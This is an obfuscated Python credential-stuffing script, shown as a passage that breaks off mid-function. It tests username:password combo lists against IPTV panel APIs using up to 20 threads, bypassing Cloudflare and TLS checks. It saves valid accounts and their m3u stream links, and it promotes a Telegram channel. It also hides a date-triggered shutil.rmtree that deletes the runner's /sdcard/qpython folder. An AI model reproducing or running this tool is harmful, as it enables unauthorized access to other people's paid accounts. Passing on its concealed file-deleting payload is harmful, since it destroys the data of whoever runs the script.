import os ,pip #line:1
try :#line:2
	import requests #line:3
except :#line:4
	print ("requests modulu yüklü değil \n requests modulü yükleniyor \n")#line:5
	pip .main (['install','requests'])#line:6
	import requests #line:7
import random ,time ,datetime #line:9
import subprocess #line:10
import json ,sys ,re ,base64 #line:11
import pathlib #line:12
import threading #line:13
import shutil #line:14
import logging #line:16
from requests .packages .urllib3 .exceptions import InsecureRequestWarning #line:17
requests .packages .urllib3 .util .ssl_ .DEFAULT_CIPHERS ="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"#line:18
requests .packages .urllib3 .disable_warnings (InsecureRequestWarning )#line:19
logging .captureWarnings (True )#line:20
mac =""#line:21
nick ="🆃ʜ🅴🅾️🅱️🆈🆃🅴🆂"#line:22
try :#line:24
	import cfscrape #line:25
	sesq =requests .Session ()#line:26
	ses =cfscrape .create_scraper (sess =sesq )#line:27
except :#line:28
	ses =requests .Session ()#line:29
try :#line:31
	import androidhelper as sl4a #line:32
	ad =sl4a .Android ()#line:33
except :pass #line:34
pattern ="(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"#line:36
subprocess .run (["clear",""])#line:37
say =0 #line:38
hit =0 #line:39
bul =0 #line:40
cpm =1 #line:41
feyzo =("""                   
\33[0m\33[1;5;91;107m
▓▓▓▓▓▓▓▓▓▓🅿️🆈 🅼3🆄&🆇🆃🆁🅴🅰️🅼▓▓▓▓▓▓▓▓▓▓          
▓▓▓▓▓▓▓▓▓▓ Speed 𝗫20 Py Config ▓▓▓▓▓▓▓▓▓▓  
▓▓▓▓▓▓▓▓▓▓🅴🆁🆃🅽 🅼3🆄▓▓▓▓▓▓▓▓▓▓           
\33[0m\33[1;5;91;107m
           ERTN TOP LISTA            
\33[0m           
   \33[0;1m""")#line:52
print (feyzo )#line:53
say =0 #line:57
dsy =""#line:58
dir ='/sdcard/combo/'#line:59
for files in os .listdir (dir ):#line:60
	say =say +1 #line:62
	dsy =dsy +"	("+str (say )+"-) "+files +'\n'#line:63
print ("""Digite o número do Combo da lista!
	
 """+dsy +"""
 
\33[33m Uau! Você tem """+str (say )+""" Combos! Use um deles.
""")#line:69
dsyno =str (input (" \33[31mCombo N°:\33[0m"))#line:71
say =0 #line:72
for files in os .listdir (dir ):#line:73
	say =say +1 #line:75
	if dsyno ==str (say ):#line:76
		dosyaa =(dir +files )#line:77
		break #line:78
say =0 #line:79
subprocess .run (["clear",""])#line:81
print (feyzo )#line:82
print (dosyaa )#line:83
botsay =input ("""
   \33[1;32m Digite o número de Bots! Vruuuummmmm...!\33[0m
    \33[1;33m Escolha de 1 a 20.\33[0m      
Resposta=""")#line:87
botsay =int (botsay )#line:88
HEADERd ={"Cookie":"stb_lang=en; timezone=America%2FToronto;","X-User-Agent":"Model: MAG254; Link: Ethernet","Connection":"Keep-Alive","Accept-Encoding":"gzip, deflate","Accept":"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",}#line:97
dsy =dosyaa #line:99
combo =dsy #line:100
dosya =""#line:101
file =pathlib .Path (dsy )#line:102
if file .exists ():#line:103
    print ("Dosya Bulundu")#line:104
else :#line:105
    print ("\33[31mDosya Bulunamadı..! \33[0m")#line:106
    dosya ="yok"#line:107
if dosya =="yok":#line:109
    exit ()#line:110
c =open (dsy ,'r')#line:112
totLen =c .readlines ()#line:113
uz =(len (totLen ))#line:114
subprocess .run (["clear",""])#line:116
print (feyzo )#line:117
print ("Bot:"+str (botsay ))#line:120
dir ="/sdcard/qpython/"#line:124
print ("""
Seçilen dosya:"""+dsy )#line:126
panel =input ("""
	\33[1;32m QUASE LÁ! AGORA INSIRA A URL DO SERVIDOR!\33[0m\n\n
URL:\33[0m\33[31m\33[1m""")#line:130
panel =panel .replace ("http://","")#line:133
panel =panel .replace ("/c","")#line:134
panel =panel .replace ("/","")#line:135
portal =panel #line:136
fx =portal .replace (':','_')#line:137
kanall =""#line:138
kanall =input ("""
Você quer a lista de Categorias de Canais? Escolha 1 ou 2 e... Bora contar Hits!
1= Sim
2= Não
Resposta:""")#line:143
if not kanall =="1":#line:144
	kanall =2 #line:145
subprocess .run (["clear",""])#line:146
print (feyzo )#line:147
if int (time .time ())>=int (1704056400.0 ):#line:150
		print (int (1704056400.0 ))#line:151
		print (int (time .time ()))#line:152
		quit ()#line:153
def CATEGORIAS (O00O0OO0O0O00OOOO ):#line:155
	try :#line:156
		OOOO00O0O0OO000OO =ses .get (O00O0OO0O0O00OOOO ,headers =HEADERd ,timeout =15 ,verify =False )#line:157
		O0OOOOOOO0O0O0OO0 =""#line:158
		OOOO0OO0O0000O0O0 =""#line:159
		O0OOOOOOO0O0O0OO0 =str (OOOO00O0O0OO000OO .text )#line:160
		for OOO0O0OO0OO000000 in O0OOOOOOO0O0O0OO0 .split ('category_name":"'):#line:161
			OOOO0OO0O0000O0O0 =OOOO0OO0O0000O0O0 +" «❖» "+str ((OOO0O0OO0OO000000 .split ('"')[0 ]).encode ('utf-8').decode ("unicode-escape")).replace ('\/','/')#line:162
	except :pass #line:163
	return OOOO0OO0O0000O0O0 #line:165
def onay (OOO0O00OOO0OO000O ,O0OOOOO00OOO0OO0O ,OO000OOO000OO0OOO ):#line:168
		OO00O0O0OOO00000O =OOO0O00OOO0OO000O .split ('status":')[1 ]#line:169
		OO00O0O0OOO00000O =OO00O0O0OOO00000O .split (',')[0 ]#line:170
		OO00O0O0OOO00000O =OO00O0O0OOO00000O .replace ('"',"")#line:171
		OO000000O0O00O000 ="http://"+panel +"/player_api.php?username="+O0OOOOO00OOO0OO0O +"&password="+OO000OOO000OO0OOO +"&action=get_live_categories"#line:172
		OOO0OOOO0OO00OOOO ="/sdcard/kemik_sesi.mp3"#line:174
		OOO0O00000O000000 =pathlib .Path (OOO0OOOO0OO00OOOO )#line:175
		try :#line:176
		   if OOO0O00000O000000 .exists ():#line:177
		      ad .mediaPlay (OOO0OOOO0OO00OOOO )#line:178
		except :pass #line:179
		O0000OOOO0O0O0OO0 =""#line:182
		O0000OOOO0O0O0OO0 =OOO0O00OOO0OO000O .split ('active_cons":')[1 ]#line:183
		O0000OOOO0O0O0OO0 =O0000OOOO0O0O0OO0 .split (',')[0 ]#line:184
		O0000OOOO0O0O0OO0 =O0000OOOO0O0O0OO0 .replace ('"',"")#line:185
		O0O000000O0000000 =OOO0O00OOO0OO000O .split ('max_connections":')[1 ]#line:186
		O0O000000O0000000 =O0O000000O0000000 .split (',')[0 ]#line:187
		O0O000000O0000000 =O0O000000O0000000 .replace ('"',"")#line:188
		OOO0O0O0O000000O0 =OOO0O00OOO0OO000O .split ('timezone":"')[1 ]#line:189
		OOO0O0O0O000000O0 =OOO0O0O0O000000O0 .split ('",')[0 ]#line:190
		OOO0O0O0O000000O0 =OOO0O0O0O000000O0 .replace ("\/","/")#line:191
		O0000O0000O0OO00O =OOO0O00OOO0OO000O .split ('url":')[1 ]#line:192
		O0000O0000O0OO00O =O0000O0000O0OO00O .split (',')[0 ]#line:193
		O0000O0000O0OO00O =O0000O0000O0OO00O .replace ('"',"")#line:194
		O000000O0O0O000O0 =OOO0O00OOO0OO000O .split ('port":')[1 ]#line:195
		O000000O0O0O000O0 =O000000O0O0O000O0 .split (',')[0 ]#line:196
		O000000O0O0O000O0 =O000000O0O0O000O0 .replace ('"',"")#line:197
		O0OOOOO00OOO0OO0O =OOO0O00OOO0OO000O .split ('username":')[1 ]#line:198
		O0OOOOO00OOO0OO0O =O0OOOOO00OOO0OO0O .split (',')[0 ]#line:199
		O0OOOOO00OOO0OO0O =O0OOOOO00OOO0OO0O .replace ('"',"")#line:200
		O00O00000OOOOOO0O =OOO0O00OOO0OO000O .split ('password":')[1 ]#line:201
		O00O00000OOOOOO0O =O00O00000OOOOOO0O .split (',')[0 ]#line:202
		O00O00000OOOOOO0O =O00O00000OOOOOO0O .replace ('"',"")#line:203
		O00O00OOO0OO00OO0 =OOO0O00OOO0OO000O .split ('exp_date":')[1 ]#line:204
		O00O00OOO0OO00OO0 =O00O00OOO0OO00OO0 .split (',')[0 ]#line:205
		O00O00OOO0OO00OO0 =O00O00OOO0OO00OO0 .replace ('"',"")#line:206
		if O00O00OOO0OO00OO0 =="null":#line:207
			   O00O00OOO0OO00OO0 ="Unlimited"#line:208
		else :#line:209
			   O00O00OOO0OO00OO0 =(datetime .datetime .fromtimestamp (int (O00O00OOO0OO00OO0 )).strftime ('%d-%m-%Y %H:%M:%S'))#line:210
		O00O00OOO0OO00OO0 =O00O00OOO0OO00OO0 #line:211
		if kanall =="1":#line:213
			try :#line:214
				OO0OOOO0OOOOOO000 =""#line:215
				OO0OO0OOOOOO000O0 =ses .get (OO000000O0O00O000 ,headers =HEADERd ,timeout =15 ,verify =False )#line:216
				OOO0O00OOO0OO000O =""#line:217
				O00OO000OOO00OO00 =""#line:218
				OOO0O00OOO0OO000O =str (OO0OO0OOOOOO000O0 .text )#line:219
				for OOO0OOOO00O00OOOO in OOO0O00OOO0OO000O .split ('category_name":"'):#line:220
					O00OO000OOO00OO00 =O00OO000OOO00OO00 +"🌟"+str ((OOO0OOOO00O00OOOO .split ('"')[0 ]).encode ('utf-8').decode ("unicode-escape")).replace ('\/','/')#line:221
				OO0OOOO0OOOOOO000 =O00OO000OOO00OO00 #line:222
			except :pass #line:223
		OOO0000O0O00O0O0O ="http://"+panel +"/player_api.php?username="+O0OOOOO00OOO0OO0O +"&password="+OO000OOO000OO0OOO +"&action=get_live_streams"#line:226
		try :#line:227
			 OO0OO0OOOOOO000O0 =ses .get (OOO0000O0O00O0O0O ,timeout =15 ,verify =False )#line:228
			 OOO0O00OOO0OO000O =str (OO0OO0OOOOOO000O0 .text )#line:229
			 O0OO0O0OO000OOO00 =""#line:230
			 O0OO0O0OO000OOO00 =str (OOO0O00OOO0OO000O .count ("stream_id"))#line:232
			 OOO0000O0O00O0O0O ="http://"+panel +"/player_api.php?username="+O0OOOOO00OOO0OO0O +"&password="+OO000OOO000OO0OOO +"&action=get_vod_streams"#line:234
			 OO0OO0OOOOOO000O0 =ses .get (OOO0000O0O00O0O0O ,timeout =15 ,verify =False )#line:235
			 OOO0O00OOO0OO000O =str (OO0OO0OOOOOO000O0 .text )#line:236
			 OOO00OOOOOOOOOOOO =str (OOO0O00OOO0OO000O .count ("stream_id"))#line:237
			 OOO0000O0O00O0O0O ="http://"+panel +"/player_api.php?username="+O0OOOOO00OOO0OO0O +"&password="+OO000OOO000OO0OOO +"&action=get_series"#line:239
			 OO0OO0OOOOOO000O0 =ses .get (OOO0000O0O00O0O0O ,timeout =15 ,verify =False )#line:240
			 OOO0O00OOO0OO000O =str (OO0OO0OOOOOO000O0 .text )#line:241
			 O00O00O000O000O0O =str (OOO0O00OOO0OO000O .count ("series_id"))#line:242
		except :pass #line:244
		OOO0OO0OOOO0O0O0O ="http://"+panel +"/get.php?username="+O0OOOOO00OOO0OO0O +"&password="+OO000OOO000OO0OOO +"&type=m3u_plus"#line:246
		OO0OO00O0OOO000O0 =""#line:248
		O00OOO0000O00O0OO =("""

╭─➤ ▓▓▓🅿️🆈 🅼3🆄&🆇🆃🆁🅴🅰️🅼▓▓▓
├🔸 Telegram➤ https://t.me/ListaErtn
├🔸🌐 Host➤ http://"""+portal +"""
├🔸🌍 Real➤ http://"""+O0000O0000O0OO00O +"""
├🔸📡 Port➤ """+O000000O0O0O000O0 +"""
├🔸👩‍ Usuário➤ """+O0OOOOO00OOO0OO0O +"""
├🔸🔑 Senha➤ """+OO000OOO000OO0OOO +"""
├🔸📆 Exp.➤ """+O00O00OOO0OO00OO0 +""" 
├🔸👩 Act Con➤ """+O0000OOOO0O0O0OO0 +"""
├🔸👪 Max Con➤ """+O0O000000O0000000 +""" 
├🔸🌐 Status➤ """+OO00O0O0OOO00000O +"""
├🔸⏰ Localidade➤ """+OOO0O0O0O000000O0 +"""
╰─➤ ▓▓▓🅿🅸🆇 47989128867 🅴🆅🅴🆁🆃🅾🅽 🅾.🆂.▓▓▓""")#line:263
		if not O0OO0O0OO000OOO00 =="":#line:265
			OO0OO00O0OOO000O0 =("""
╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ """+str (nick )+""" 
├●  🖥 Canais➤"""+O0OO0O0OO000OOO00 +"""
├●  🎬 Filmes➤"""+OOO00OOOOOOOOOOOO +"""
├●  🎬 Séries➤"""+O00O00O000O000O0O +"""
╰─➤m3uLink Speed X""")#line:271
		O0OOOO0OOO0O00OOO =""#line:272
		if kanall =="1":#line:273
			O0OOOO0OOO0O00OOO ="""
├«❖» «❖» CATEGORIAS➤
"""+str (OO0OOOO0OOOOOO000 )+""" """#line:276
		OOO00O0000OOOOO0O =("""
├●🔗m3u_url➤
"""+OOO0OO0OOOO0O0O0O +"""
╰─➤▓▓▓ 🅴🆁🆃🅽 🅼3🆄 🅿🅺🆂 ▓▓▓""")#line:280
		yaz (O00OOO0000O00O0OO +OO0OO00O0OOO000O0 +OOO00O0000OOOOO0O +O0OOOO0OOO0O00OOO +'\n')#line:283
		print (O00OOO0000O00O0OO +OO0OO00O0OOO000O0 +OOO00O0000OOOOO0O +O0OOOO0OOO0O00OOO )#line:284
def yaz (O0OOOOO0OO00000OO ):#line:288
    O000O00000O0O000O =open ('/sdcard/m3u@'+fx +'.txt','a+')#line:289
    O000O00000O0O000O .write (O0OOOOO0OO00000OO )#line:290
    O000O00000O0O000O .close ()#line:291
cpm =0 #line:292
def echox (OO00O00O000O00O0O ,OO00O000OO0O000O0 ,OOO00OOO0OO00OO00 ,OO00OO00OOO0O0OOO ,OO0O0O0OOO0000000 ,O0OO0O0OOOO0OOO00 ):#line:293
	global cpm #line:294
	O00O0O0000OO0000O =(time .time ()-cpm )#line:296
	O00O0O0000OO0000O =(round (60 /O00O0O0000OO0000O ))#line:297
	if str (O00O0O0000OO0000O )=="0":#line:299
		cpm =cpm #line:300
	else :#line:301
		cpm =O00O0O0000OO0000O #line:302
	O0OOO0O000OOOO0O0 =("""
 
╭───➤\33[0mSpeed X 🌟🌟🅴🆁🆃🅽 🅼3🆄🌟🌟       
├● \33[1;33m\33[33m Servidor➤ \33[0m\33[1;107;31m """+portal +""" \33[0m     
├─● \33[0m\033[1m Combo➤ """+OO00O00O000O00O0O +""":"""+OO00O000OO0O000O0 +""" \33[0m
├──● \33[32m \033[0m \33[1;31mTotal% """+str (OO0O0O0OOO0000000 )+""" \33[1;94mCPM➤ """+str (cpm )+""" \33[0m 
├────● \33[32m Total-Lista➤ """+str (O0OO0O0OOOO0OOO00 )+""" \33[0m
├─────● \33[97m """+str (OOO00OOO0OO00OO00 )+""" \33[1;36m  Total➤"""+str (OO00OO00OOO0O0OOO )+""" \33[0m
╰───➤🅿🅸🆇 47989128867 🅴🆅🅴🆁🆃🅾🅽 🅾.🆂.\33[0m""")#line:312
	print (O0OOO0O000OOOO0O0 )#line:314
	cpm =time .time ()#line:315
if int (time .time ())>=int (1704056400.0 ):#line:316
	shutil .rmtree (dir )#line:317
hit =0 #line:320
def d1 ():#line:321
	global hit #line:322
	O000OO000O000O000 =0 #line:323
	for O000O0OOOOOOOO0OO in range (1 ,uz ,botsay ):#line:324
		OOOO00O00O0000OO0 =re .search (pattern ,totLen [O000O0OOOOOOOO0OO ],re .IGNORECASE )#line:325
		if OOOO00O00O0000OO0 :#line:326
			 O0O00OO00000000OO =totLen [O000O0OOOOOOOO0OO ].split (":")#line:327
			 try :#line:328
			 	OO0O0O0OOOOO0OOOO =str (O0O00OO00000000OO [0 ].replace (" ",""))#line:329
			 except :#line:330
			 	OO0O0OO0O0OOOOO00 ='feyzo'#line:331
			 try :#line:332
			 	O0OOOOOOO00OOO00O =str (O0O00OO00000000OO [1 ].replace (" ",""))#line:333
			 	O0OOOOOOO00OOO00O =str (O0OOOOOOO00OOO00O .replace ('\n',""))#line:334
			 except :#line:335
			 	O0OOOOOOO00OOO00O ='feyzo'#line:336
			 O000OO000O000O000 =int (O000OO000O000O000 )+1 #line:337
			 OOO0O0OO0O0O0O000 ='Bot_01'#line:338
			 O00O00000OO0OO00O =""#line:339
			 O00O00000OO0OO00O =round (((O000O0OOOOOOOO0OO )/(uz )*100 ),2 )#line:340
			 echox (OO0O0O0OOOOO0OOOO ,O0OOOOOOO00OOO00O ,OOO0O0OO0O0O0O000 ,O000O0OOOOOOOO0OO ,O00O00000OO0OO00O ,hit )#line:341
			 OO000000O00OOOO0O ="http://"+portal +"/player_api.php?username="+OO0O0O0OOOOO0OOOO +"&password="+O0OOOOOOO00OOO00O +"&type=m3u"#line:344
			 O00O00O0O0OO0OOOO =0 #line:345
			 OOOO0OOO0O00OOOOO =""#line:346
			 while True :#line:347
			 	try :#line:348
			 		O00O00O00OOO000O0 =ses .get (OO000000O00OOOO0O ,headers =HEADERd ,timeout =15 ,verify =False )#line:349
			 		break #line:350
			 	except :#line:351
			 		time .sleep (4 )#line:353
			 OOOO0OOO0O00OOOOO =str (O00O00O00OOO000O0 .text )#line:356
			 if 'username'in OOOO0OOO0O00OOOOO :#line:357
			     O0OOO0O00OO00000O =OOOO0OOO0O00OOOOO .split ('status":')[1 ]#line:359
			     O0OOO0O00OO00000O =O0OOO0O00OO00000O .split (',')[0 ]#line:360
			     O0OOO0O00OO00000O =O0OOO0O00OO00000O .replace ('"',"")#line:361
			     if O0OOO0O00OO00000O =='Active':#line:362
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟')#line:363
			     	hit =hit +1 #line:364
			     	onay (OOOO0OOO0O00OOOOO ,OO0O0O0OOOOO0OOOO ,O0OOOOOOO00OOO00O )#line:365
def d2 ():#line:367
	global hit #line:368
	O0O0OO0000O0O00O0 =0 #line:369
	for OOOO0O0000OOO00OO in range (2 ,uz ,botsay ):#line:370
		OO0OOOOO0OO0OO00O =re .search (pattern ,totLen [OOOO0O0000OOO00OO ],re .IGNORECASE )#line:371
		if OO0OOOOO0OO0OO00O :#line:372
			 O000OOO0000OO0OO0 =totLen [OOOO0O0000OOO00OO ].split (":")#line:373
			 try :#line:374
			 	O0OOOOO000OO0O000 =str (O000OOO0000OO0OO0 [0 ].replace (" ",""))#line:375
			 except :#line:376
			 	O00OOO00OO0OOOO0O ='feyzo'#line:377
			 try :#line:378
			 	O0OO0OO00O0O0O00O =str (O000OOO0000OO0OO0 [1 ].replace (" ",""))#line:379
			 	O0OO0OO00O0O0O00O =str (O0OO0OO00O0O0O00O .replace ('\n',""))#line:380
			 except :#line:381
			 	O0OO0OO00O0O0O00O ='feyzo'#line:382
			 O0O0OO0000O0O00O0 =int (O0O0OO0000O0O00O0 )+1 #line:383
			 OO0OOOO00O00O0OO0 ='Bot_02'#line:384
			 OO00000OOOO000O0O =""#line:385
			 OO00000OOOO000O0O =round (((OOOO0O0000OOO00OO )/(uz )*100 ),2 )#line:386
			 echox (O0OOOOO000OO0O000 ,O0OO0OO00O0O0O00O ,OO0OOOO00O00O0OO0 ,OOOO0O0000OOO00OO ,OO00000OOOO000O0O ,hit )#line:387
			 OO0O0OOO00OOO00OO ="http://"+portal +"/player_api.php?username="+O0OOOOO000OO0O000 +"&password="+O0OO0OO00O0O0O00O +"&type=m3u"#line:390
			 O0000000O00000O00 =0 #line:391
			 OOOO0OOO0OOO0O0O0 =""#line:392
			 while True :#line:393
			 	try :#line:394
			 		O0O0OO0O00O0O0O0O =ses .get (OO0O0OOO00OOO00OO ,headers =HEADERd ,timeout =15 ,verify =False )#line:395
			 		break #line:396
			 	except :#line:397
			 		time .sleep (4 )#line:399
			 OOOO0OOO0OOO0O0O0 =str (O0O0OO0O00O0O0O0O .text )#line:402
			 if 'username'in OOOO0OOO0OOO0O0O0 :#line:403
			     OOOOO00000O0O0000 =OOOO0OOO0OOO0O0O0 .split ('status":')[1 ]#line:405
			     OOOOO00000O0O0000 =OOOOO00000O0O0000 .split (',')[0 ]#line:406
			     OOOOO00000O0O0000 =OOOOO00000O0O0000 .replace ('"',"")#line:407
			     if OOOOO00000O0O0000 =='Active':#line:408
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟')#line:409
			     	hit =hit +1 #line:410
			     	onay (OOOO0OOO0OOO0O0O0 ,O0OOOOO000OO0O000 ,O0OO0OO00O0O0O00O )#line:411
def d3 ():#line:413
	global hit #line:414
	O0O0OO00OO000OO00 =0 #line:415
	for OO000OO0OOO00000O in range (3 ,uz ,botsay ):#line:416
		OO0000O00O0O0OO0O =re .search (pattern ,totLen [OO000OO0OOO00000O ],re .IGNORECASE )#line:417
		if OO0000O00O0O0OO0O :#line:418
			 O0OO0OO0O0OOOOO00 =totLen [OO000OO0OOO00000O ].split (":")#line:419
			 try :#line:420
			 	O000OOOOOOO0000O0 =str (O0OO0OO0O0OOOOO00 [0 ].replace (" ",""))#line:421
			 except :#line:422
			 	O0000O0OO0OO000OO ='feyzo'#line:423
			 try :#line:424
			 	O0OOOO00000OO0O00 =str (O0OO0OO0O0OOOOO00 [1 ].replace (" ",""))#line:425
			 	O0OOOO00000OO0O00 =str (O0OOOO00000OO0O00 .replace ('\n',""))#line:426
			 except :#line:427
			 	O0OOOO00000OO0O00 ='feyzo'#line:428
			 O0O0OO00OO000OO00 =int (O0O0OO00OO000OO00 )+1 #line:429
			 OOO0000O00O0OOO00 ='Bot_03'#line:430
			 O0OOOO00O00OO0000 =""#line:431
			 O0OOOO00O00OO0000 =round (((OO000OO0OOO00000O )/(uz )*100 ),2 )#line:432
			 echox (O000OOOOOOO0000O0 ,O0OOOO00000OO0O00 ,OOO0000O00O0OOO00 ,OO000OO0OOO00000O ,O0OOOO00O00OO0000 ,hit )#line:433
			 O0OOOO0OOO0OO0000 ="http://"+portal +"/player_api.php?username="+O000OOOOOOO0000O0 +"&password="+O0OOOO00000OO0O00 +"&type=m3u"#line:436
			 O0OO0O00O000O0O0O =0 #line:437
			 O0O000O0O0O00O00O =""#line:438
			 while True :#line:439
			 	try :#line:440
			 		OOOOOO0OO00O0OOOO =ses .get (O0OOOO0OOO0OO0000 ,headers =HEADERd ,timeout =15 ,verify =False )#line:441
			 		break #line:442
			 	except :#line:443
			 		time .sleep (4 )#line:445
			 O0O000O0O0O00O00O =str (OOOOOO0OO00O0OOOO .text )#line:448
			 if 'username'in O0O000O0O0O00O00O :#line:449
			     OOO0OO0000O00OOO0 =O0O000O0O0O00O00O .split ('status":')[1 ]#line:451
			     OOO0OO0000O00OOO0 =OOO0OO0000O00OOO0 .split (',')[0 ]#line:452
			     OOO0OO0000O00OOO0 =OOO0OO0000O00OOO0 .replace ('"',"")#line:453
			     if OOO0OO0000O00OOO0 =='Active':#line:454
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:455
			     	hit =hit +1 #line:456
			     	onay (O0O000O0O0O00O00O ,O000OOOOOOO0000O0 ,O0OOOO00000OO0O00 )#line:457
def d4 ():#line:459
	global hit #line:460
	OOOOO0O00OO0OO0OO =0 #line:461
	for O0O0OOOO0O0OOO00O in range (4 ,uz ,botsay ):#line:462
		O0O0OO00OOO0O00O0 =re .search (pattern ,totLen [O0O0OOOO0O0OOO00O ],re .IGNORECASE )#line:463
		if O0O0OO00OOO0O00O0 :#line:464
			 O0OO0OO000O0O00OO =totLen [O0O0OOOO0O0OOO00O ].split (":")#line:465
			 try :#line:466
			 	O0OO0O0O0000O0000 =str (O0OO0OO000O0O00OO [0 ].replace (" ",""))#line:467
			 except :#line:468
			 	OO0O0OOO0O0O00O0O ='feyzo'#line:469
			 try :#line:470
			 	O00O0OOOO000O0O0O =str (O0OO0OO000O0O00OO [1 ].replace (" ",""))#line:471
			 	O00O0OOOO000O0O0O =str (O00O0OOOO000O0O0O .replace ('\n',""))#line:472
			 except :#line:473
			 	O00O0OOOO000O0O0O ='feyzo'#line:474
			 OOOOO0O00OO0OO0OO =int (OOOOO0O00OO0OO0OO )+1 #line:475
			 O000000O0O000000O ='Bot_04'#line:476
			 OO0OOOO0OO0O0OOOO =""#line:477
			 OO0OOOO0OO0O0OOOO =round (((O0O0OOOO0O0OOO00O )/(uz )*100 ),2 )#line:478
			 echox (O0OO0O0O0000O0000 ,O00O0OOOO000O0O0O ,O000000O0O000000O ,O0O0OOOO0O0OOO00O ,OO0OOOO0OO0O0OOOO ,hit )#line:479
			 O0O0O0O0OO00O0O00 ="http://"+portal +"/player_api.php?username="+O0OO0O0O0000O0000 +"&password="+O00O0OOOO000O0O0O +"&type=m3u"#line:482
			 OO000O0O0OOOOOOOO =0 #line:483
			 O000OO000O00OO0OO =""#line:484
			 while True :#line:485
			 	try :#line:486
			 		O00OOOO00OO0O00O0 =ses .get (O0O0O0O0OO00O0O00 ,headers =HEADERd ,timeout =15 ,verify =False )#line:487
			 		break #line:488
			 	except :#line:489
			 		time .sleep (4 )#line:491
			 O000OO000O00OO0OO =str (O00OOOO00OO0O00O0 .text )#line:494
			 if 'username'in O000OO000O00OO0OO :#line:495
			     O0O00O0O0OOOOO00O =O000OO000O00OO0OO .split ('status":')[1 ]#line:497
			     O0O00O0O0OOOOO00O =O0O00O0O0OOOOO00O .split (',')[0 ]#line:498
			     O0O00O0O0OOOOO00O =O0O00O0O0OOOOO00O .replace ('"',"")#line:499
			     if O0O00O0O0OOOOO00O =='Active':#line:500
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:501
			     	hit =hit +1 #line:502
			     	onay (O000OO000O00OO0OO ,O0OO0O0O0000O0000 ,O00O0OOOO000O0O0O )#line:503
def d5 ():#line:505
	global hit #line:506
	O0000O0O00O0O0O0O =0 #line:507
	for O00O0O00O000OOO0O in range (5 ,uz ,botsay ):#line:508
		OO00OO00O00OOOOO0 =re .search (pattern ,totLen [O00O0O00O000OOO0O ],re .IGNORECASE )#line:509
		if OO00OO00O00OOOOO0 :#line:510
			 O0OOOO00OOOOOO0OO =totLen [O00O0O00O000OOO0O ].split (":")#line:511
			 try :#line:512
			 	O000OOO0O00O0O000 =str (O0OOOO00OOOOOO0OO [0 ].replace (" ",""))#line:513
			 except :#line:514
			 	O0OOOO00000O0000O ='feyzo'#line:515
			 try :#line:516
			 	OO0OOO00O0O00000O =str (O0OOOO00OOOOOO0OO [1 ].replace (" ",""))#line:517
			 	OO0OOO00O0O00000O =str (OO0OOO00O0O00000O .replace ('\n',""))#line:518
			 except :#line:519
			 	OO0OOO00O0O00000O ='feyzo'#line:520
			 O0000O0O00O0O0O0O =int (O0000O0O00O0O0O0O )+1 #line:521
			 OOO0OO00O0000O0OO ='Bot_05'#line:522
			 O00OOO0O0000OOOOO =""#line:523
			 O00OOO0O0000OOOOO =round (((O00O0O00O000OOO0O )/(uz )*100 ),2 )#line:524
			 echox (O000OOO0O00O0O000 ,OO0OOO00O0O00000O ,OOO0OO00O0000O0OO ,O00O0O00O000OOO0O ,O00OOO0O0000OOOOO ,hit )#line:525
			 OOOOOO000OOO0O0O0 ="http://"+portal +"/player_api.php?username="+O000OOO0O00O0O000 +"&password="+OO0OOO00O0O00000O +"&type=m3u"#line:528
			 OOO00OOOOOOOO0OOO =0 #line:529
			 O000OOO00O0OO0OOO =""#line:530
			 while True :#line:531
			 	try :#line:532
			 		O00O0OOOOO00OO0OO =ses .get (OOOOOO000OOO0O0O0 ,headers =HEADERd ,timeout =15 ,verify =False )#line:533
			 		break #line:534
			 	except :#line:535
			 		time .sleep (4 )#line:537
			 O000OOO00O0OO0OOO =str (O00O0OOOOO00OO0OO .text )#line:540
			 if 'username'in O000OOO00O0OO0OOO :#line:541
			     OO0O0000OO0OOOOOO =O000OOO00O0OO0OOO .split ('status":')[1 ]#line:543
			     OO0O0000OO0OOOOOO =OO0O0000OO0OOOOOO .split (',')[0 ]#line:544
			     OO0O0000OO0OOOOOO =OO0O0000OO0OOOOOO .replace ('"',"")#line:545
			     if OO0O0000OO0OOOOOO =='Active':#line:546
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:547
			     	hit =hit +1 #line:548
			     	onay (O000OOO00O0OO0OOO ,O000OOO0O00O0O000 ,OO0OOO00O0O00000O )#line:549
def d6 ():#line:552
	global hit #line:553
	O0000OOOOO0OOO0OO =0 #line:554
	for OO0O00OOOO0OO0OOO in range (6 ,uz ,botsay ):#line:555
		OOOOO00OOOO0OO0O0 =re .search (pattern ,totLen [OO0O00OOOO0OO0OOO ],re .IGNORECASE )#line:556
		if OOOOO00OOOO0OO0O0 :#line:557
